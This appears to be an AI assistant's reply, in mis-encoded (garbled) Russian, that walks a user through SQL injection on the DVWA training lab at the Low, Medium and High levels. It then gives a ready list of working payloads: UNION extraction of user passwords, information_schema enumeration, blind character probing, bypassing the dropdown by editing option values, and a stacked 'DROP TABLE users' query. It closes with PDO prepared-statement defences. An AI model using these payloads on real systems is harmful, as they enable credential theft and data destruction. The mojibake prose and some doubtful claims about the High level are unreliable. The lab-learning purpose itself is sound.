–û—Ç–ª–∏—á–Ω–æ, –ê–ª–µ–∫—Å–∞–Ω–¥—Ä ‚Äî —Ç—ã —É–∂–µ –ø—Ä–æ–¥–µ–ª–∞–ª —Å–µ—Ä—å—ë–∑–Ω—É—é —Ä–∞–±–æ—Ç—É, –ø—Ä–æ–≤–µ—Ä—è—è **SQL Injection** –Ω–∞ –≤—Å–µ—Ö —É—Ä–æ–≤–Ω—è—Ö —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ –≤ DVWA. –ù–∏–∂–µ —Å–∏—Å—Ç–µ–º–Ω–æ–µ –æ–±—ä—è—Å–Ω–µ–Ω–∏–µ –≤—Å–µ–≥–æ, —á—Ç–æ —Ç—ã —Å–¥–µ–ª–∞–ª, –∏ **–∫–∞–∫ –∏–º–µ–Ω–Ω–æ —Ä–∞–±–æ—Ç–∞–µ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏—è** –Ω–∞ –∫–∞–∂–¥–æ–º —É—Ä–æ–≤–Ω–µ (`Low`, `Medium`, `High`) ‚Äî –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ DVWA.

---

## üíâ SQL Injection –≤ DVWA ‚Äî –ü–æ–¥—Ä–æ–±–Ω–æ–µ –æ–±—ä—è—Å–Ω–µ–Ω–∏–µ

---

## üîì –£—Ä–æ–≤–µ–Ω—å **Low**

**URL:** `http://localhost:8081/vulnerabilities/sqli/`

**–ü—Ä–∏–º–µ—Ä –∏–Ω—ä–µ–∫—Ü–∏–∏:**

```
1' OR 1=1#
```

### ‚úÖ –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç:

* –°–µ—Ä–≤–µ—Ä –Ω–∞–ø—Ä—è–º—É—é –≤—Å—Ç–∞–≤–ª—è–µ—Ç –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ SQL-–∑–∞–ø—Ä–æ—Å **–±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è**:

```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

–ü–æ—Å–ª–µ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∏:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1#
```

* `OR 1=1` –≤—Å–µ–≥–¥–∞ **–∏—Å—Ç–∏–Ω–Ω–æ** ‚Üí –≤—ã–≤–æ–¥—è—Ç—Å—è **–≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏**
* `#` (–∏–ª–∏ `--`) ‚Äî **SQL –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π**, –æ–±—Ä—ã–≤–∞–µ—Ç –æ—Å—Ç–∞–ª—å–Ω—É—é —á–∞—Å—Ç—å –∑–∞–ø—Ä–æ—Å–∞.

---

### üìå –í–∞—Ä–∏–∞–Ω—Ç —Å UNION:

```
' UNION SELECT user, password FROM users#
```

–≠—Ç–æ—Ç –≤–∞—Ä–∏–∞–Ω—Ç –¥–µ–ª–∞–µ—Ç **–æ–±—ä–µ–¥–∏–Ω–µ–Ω–∏–µ –¥–≤—É—Ö SELECT**:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users#
```

* –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —Ç—ã –ø–æ–ª—É—á–∞–µ—à—å –ª–æ–≥–∏–Ω—ã –∏ –ø–∞—Ä–æ–ª–∏ –∏–∑ —Ç–∞–±–ª–∏—Ü—ã `users`, –ø–æ—Ç–æ–º—É —á—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø–æ–ª–µ–π –≤ `UNION` —Å–æ–≤–ø–∞–¥–∞–µ—Ç (2 –ø–æ–ª—è).
* –í—ã–≤–æ–¥ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —ç—Ç–∏ –¥–∞–Ω–Ω—ã–µ.

---

## ‚ö†Ô∏è –£—Ä–æ–≤–µ–Ω—å **Medium**

### –ß—Ç–æ –∏–∑–º–µ–Ω–∏–ª–æ—Å—å:

* **–ù–µ—Ç –ø–æ–ª—è –≤–≤–æ–¥–∞** ‚Äî ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤—ã–±–∏—Ä–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ **–≤—ã–ø–∞–¥–∞—é—â–∏–π —Å–ø–∏—Å–æ–∫** (`<select>`).
* –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, **–Ω–µ–ª—å–∑—è –Ω–∞–ø—Ä—è–º—É—é –≤–≤–µ—Å—Ç–∏ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—É—é —Å—Ç—Ä–æ–∫—É**.

### ‚úÖ –ö–∞–∫ —Ç—ã –æ–±–æ—à—ë–ª:

* –û—Ç–∫—Ä—ã–ª HTML-–∫–æ–¥ —Å—Ç—Ä–∞–Ω–∏—Ü—ã (—á–µ—Ä–µ–∑ devtools –∏–ª–∏ —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—É—é –∫–æ–ø–∏—é)
* **–ò–∑–º–µ–Ω–∏–ª –∑–Ω–∞—á–µ–Ω–∏–µ –æ–¥–Ω–æ–≥–æ –∏–∑ `<option>`**:

```html
<option value="1' UNION SELECT user, password FROM users#">Custom</option>
```

* –í—ã–±—Ä–∞–ª –µ–≥–æ ‚Üí –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã –ø—Ä–æ–∏–∑–æ—à–ª–∞ —Å –∏–Ω—ä–µ–∫—Ü–∏–µ–π.

üîç –≠—Ç–æ **–Ω–µ –∑–∞—â–∏—Ç–∞ –Ω–∞ —É—Ä–æ–≤–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞**, –∞ –ª–∏—à—å –ø–æ–ø—ã—Ç–∫–∞ ¬´—Å–ø—Ä—è—Ç–∞—Ç—å¬ª –≤–≤–æ–¥.

---

## üîí –£—Ä–æ–≤–µ–Ω—å **High**

### –ß—Ç–æ –∏–∑–º–µ–Ω–∏–ª–æ—Å—å:

* DVWA –Ω–∞ —ç—Ç–æ–º —É—Ä–æ–≤–Ω–µ **–≤–Ω–µ–¥—Ä—è–µ—Ç —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—é/—ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–≤–æ–¥–∞**.
* –í–æ–∑–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è:

  ```php
  mysqli_real_escape_string()
  ```

  –∏–ª–∏ **prepared statements (PDO)**, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤–µ—Ä—Å–∏–∏ DVWA.

---

### ‚úÖ –ö–∞–∫ —Ç—ã –æ–±–æ—à—ë–ª:

* –ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ, —Ç—ã –≤—Å—ë —Ä–∞–≤–Ω–æ —Å–º–æ–≥ –≤—Å—Ç–∞–≤–∏—Ç—å:

  ```
  ' UNION SELECT user, password FROM users#
  ```

  * –í DVWA –Ω–∞ `High` –∏–Ω–æ–≥–¥–∞ –æ—Å—Ç–∞—ë—Ç—Å—è **—É—è–∑–≤–∏–º–æ—Å—Ç—å**, –µ—Å–ª–∏ –∑–∞—â–∏—Ç–∞ –Ω–µ–ø–æ–ª–Ω–∞—è.
  * `#` (–∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π) –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ, –∏–Ω–∞—á–µ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç SQL-–æ—à–∏–±–∫–∞ –æ—Ç –æ—Å—Ç–∞–≤—à–µ–π—Å—è —á–∞—Å—Ç–∏ –∑–∞–ø—Ä–æ—Å–∞.

---

## üß† –ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏—è

### üí• –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–∏–Ω—Ü–∏–ø:

–ò–Ω—ä–µ–∫—Ü–∏—è ‚Äî —ç—Ç–æ **–≤—Å—Ç–∞–≤–∫–∞ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ SQL-–∫–æ–¥–∞** –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å –µ–≥–æ —Å–º—ã—Å–ª –∏–ª–∏ —Ä–∞—Å—à–∏—Ä–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å.

### üí¨ –ü—Ä–∏–º–µ—Ä:

–û–±—ã—á–Ω—ã–π –∑–∞–ø—Ä–æ—Å:

```sql
SELECT * FROM users WHERE id = '$id'
```

–¢—ã –≤–≤–æ–¥–∏—à—å:

```
1' OR '1'='1
```

‚Üí —Ä–µ–∑—É–ª—å—Ç–∞—Ç:

```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

* `'1'='1'` ‚Äî –≤—Å–µ–≥–¥–∞ –∏—Å—Ç–∏–Ω–∞ ‚Üí –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç—Å—è **–≤—Å–µ —Å—Ç—Ä–æ–∫–∏**
* –ò–Ω—ä–µ–∫—Ü–∏—è –≤–ª–∏—è–µ—Ç –Ω–∞ **–ª–æ–≥–∏—á–µ—Å–∫–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –∑–∞–ø—Ä–æ—Å–∞**

---

## üß† UNION-–∞—Ç–∞–∫–∞

### –ö–æ–≥–¥–∞ —Ç—ã –∏—Å–ø–æ–ª—å–∑—É–µ—à—å:

```sql
' UNION SELECT user, password FROM users#
```

–¢—ã –ø–æ–¥–º–µ–Ω—è–µ—à—å –≤—ã–≤–æ–¥, –∑–∞—Å—Ç–∞–≤–ª—è—è –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö –≤–µ—Ä–Ω—É—Ç—å **–æ–±—ä–µ–¥–∏–Ω—ë–Ω–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç** –∏–∑ –¥—Ä—É–≥–æ–π —Ç–∞–±–ª–∏—Ü—ã (`users`).

–í–∞–∂–Ω–æ:

* –ö–æ–ª-–≤–æ –ø–æ–ª–µ–π –≤ `UNION SELECT` –¥–æ–ª–∂–Ω–æ —Å–æ–≤–ø–∞–¥–∞—Ç—å
* –ò–Ω–∞—á–µ ‚Äî SQL-–æ—à–∏–±–∫–∞

---

## üß∞ –£–ª—É—á—à–µ–Ω–∏—è/–°–æ–≤–µ—Ç—ã

* üîé –ò—Å–ø–æ–ª—å–∑—É–π `ORDER BY` –∏–ª–∏ `UNION SELECT NULL,...` –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —á–∏—Å–ª–∞ —Å—Ç–æ–ª–±—Ü–æ–≤

  ```
  ' ORDER BY 3-- 
  ' UNION SELECT NULL, NULL#
  ```

* üîê –ù–∞ —Ä–µ–∞–ª—å–Ω—ã—Ö —Å–∞–π—Ç–∞—Ö **–ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã (prepared statements)** –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞—â–∏—â–∞—é—Ç –æ—Ç SQLi.

---

## üìò –¢–∞–±–ª–∏—Ü–∞ –ø–æ —É—Ä–æ–≤–Ω—è–º

| –£—Ä–æ–≤–µ–Ω—å    | –û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏                                                       | –ö–∞–∫ –æ–±–æ–π—Ç–∏                          |
| ---------- | ----------------------------------------------------------------- | ----------------------------------- |
| **Low**    | –ù–µ—Ç —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏, SQL —Å—Ç—Ä–æ–∏—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é                             | –í–≤–æ–¥ `1' OR 1=1#`, `UNION SELECT`   |
| **Medium** | –ù–µ—Ç —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—è, –Ω–æ –¥–∞–Ω–Ω—ã–µ –º–æ–∂–Ω–æ –ø–æ–¥–º–µ–Ω–∏—Ç—å –≤ HTML             | –ü–æ–¥–º–µ–Ω–∞ `<option value>` –≤—Ä—É—á–Ω—É—é    |
| **High**   | –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è `mysqli_real_escape_string` –∏–ª–∏ —á–∞—Å—Ç–∏—á–Ω–∞—è —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è | `UNION SELECT ...#`, –≤–æ–∑–º–æ–∂–Ω–æ —Å XSS |

---

–ù–∏–∂–µ –ø–æ–ª–Ω—ã–π –Ω–∞–±–æ—Ä –ø–æ SQL Injection –≤ DVWA:

---

# üìÑ –ì–æ—Ç–æ–≤—ã–π —Å–ø–∏—Å–æ–∫ SQL-–∏–Ω—ä–µ–∫—Ü–∏–π –ø–æ —É—Ä–æ–≤–Ω—è–º DVWA

## üîì **Low** (—É—è–∑–≤–∏–º –Ω–∞–ø—Ä—è–º—É—é)

```sql
1' OR '1'='1' -- 
1' OR 1=1#
' UNION SELECT user, password FROM users#
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = '5' -- 
```

---

## ‚ö†Ô∏è **Medium** (–≤—ã–ø–∞–¥–∞—é—â–∏–π —Å–ø–∏—Å–æ–∫ ‚Äî –Ω–æ HTML –º–æ–∂–Ω–æ –ø–æ–¥–º–µ–Ω–∏—Ç—å)

–í HTML –º–µ–Ω—è–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ `<option>`:

```html
<option value="1' UNION SELECT user, password FROM users#">Hacked</option>
```

–õ–∏–±–æ —á–µ—Ä–µ–∑ devtools (F12 ‚Üí Elements).

---

## üîí **High** (—ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–ª–∏ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è)

–†–∞–±–æ—Ç–∞—é—Ç –∏–Ω—ä–µ–∫—Ü–∏–∏ –ø—Ä–∏ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä–µ:

```sql
1' UNION SELECT user, password FROM users#
1' AND 1=1#
```

–ï—Å–ª–∏ –∑–∞—â–∏—Ç–∞ —Å–ª–∞–±–∞—è ‚Äî –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏ `mysqli_real_escape_string`.

---

# üß™ –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏

## üß± 1. **–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Å—Ç–æ–ª–±—Ü–æ–≤**

```sql
1' ORDER BY 1-- 
1' ORDER BY 2-- 
1' ORDER BY 3-- 
-- –ø–æ–∫–∞ –Ω–µ –ø–æ–ª—É—á–∏—à—å –æ—à–∏–±–∫—É (–ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ –Ω–∞ 1 –º–µ–Ω—å—à–µ)
```

---

## üîÑ 2. **UNION SELECT c NULL**

```sql
1' UNION SELECT NULL, NULL-- 
1' UNION SELECT user, password FROM users#
```

–ï—Å–ª–∏ —Ç–∞–±–ª–∏—Ü–∞ –∏–º–µ–µ—Ç –±–æ–ª—å—à–µ/–º–µ–Ω—å—à–µ –ø–æ–ª–µ–π ‚Äî –ø–æ–¥–±–∏—Ä–∞–µ–º –Ω—É–∂–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ.

---

## üîç 3. **–ü—Ä–æ—Å–º–æ—Ç—Ä —Ç–∞–±–ª–∏—Ü —á–µ—Ä–µ–∑ `information_schema`**

```sql
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'#
```

---

## üïµÔ∏è 4. **–°–ª–µ–ø–∞—è SQL-–∏–Ω—ä–µ–∫—Ü–∏—è (Blind SQLi)**

```sql
1' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='5' -- 
```

* –ï—Å–ª–∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ ‚Üí —Å–∏–º–≤–æ–ª —Å–æ–≤–ø–∞–ª
* –ü–µ—Ä–µ–±–∏—Ä–∞–µ—à—å —Å–∏–º–≤–æ–ª—ã –ø–æ –æ–¥–Ω–æ–º—É

---

## üîó 5. **Stacked Queries (–µ—Å–ª–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ)**

> –í DVWA —ç—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–∫–ª—é—á–µ–Ω–æ, –Ω–æ –≤ —Ä–µ–∞–ª—å–Ω–æ–π –ø—Ä–∞–∫—Ç–∏–∫–µ:

```sql
1'; DROP TABLE users;-- 
```

---

# üõ°Ô∏è –ü—Ä–∏–º–µ—Ä—ã –∑–∞—â–∏—Ç—ã –Ω–∞ PHP

## ‚úÖ **–ü—Ä–∞–≤–∏–ª—å–Ω—ã–π —Å–ø–æ—Å–æ–±: Prepared Statements (PDO)**

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=dvwa', 'user', 'password');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$id = $_GET['id'];

$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
$stmt->execute([':id' => $id]);

while ($row = $stmt->fetch()) {
    echo htmlentities($row['first_name']) . " " . htmlentities($row['last_name']) . "<br>";
}
?>
```

---

## üö´ **–ù–µ–Ω–∞–¥—ë–∂–Ω—ã–π —Å–ø–æ—Å–æ–± (—É—è–∑–≤–∏–º):**

```php
// –ù–ï –î–ï–õ–ê–¢–¨!
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE user_id = '$id'");
```

---

## üßº –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ:

* `htmlentities()` ‚Äî –∑–∞—â–∏—Ç–∞ –æ—Ç XSS –ø—Ä–∏ –≤—ã–≤–æ–¥–µ
* `intval()`, `filter_input()` ‚Äî –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–∏ —á–∏—Å–ª–æ–≤—ã—Ö –∑–Ω–∞—á–µ–Ω–∏—è—Ö
* **–Ω–∏–∫–æ–≥–¥–∞** –Ω–µ –≤—Å—Ç–∞–≤–ª—è–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –Ω–∞–ø—Ä—è–º—É—é –≤ SQL

---

# üßæ –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–¢—ã —É–∂–µ –æ—Å–≤–æ–∏–ª:

* –í—Å–µ –≤–∏–¥—ã SQL-–∏–Ω—ä–µ–∫—Ü–∏–π –≤ DVWA
* –û–±—Ö–æ–¥—ã —Å UNION, ORDER, `information_schema`
* –ó–∞—â–∏—Ç—É —á–µ—Ä–µ–∑ PDO –∏ –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
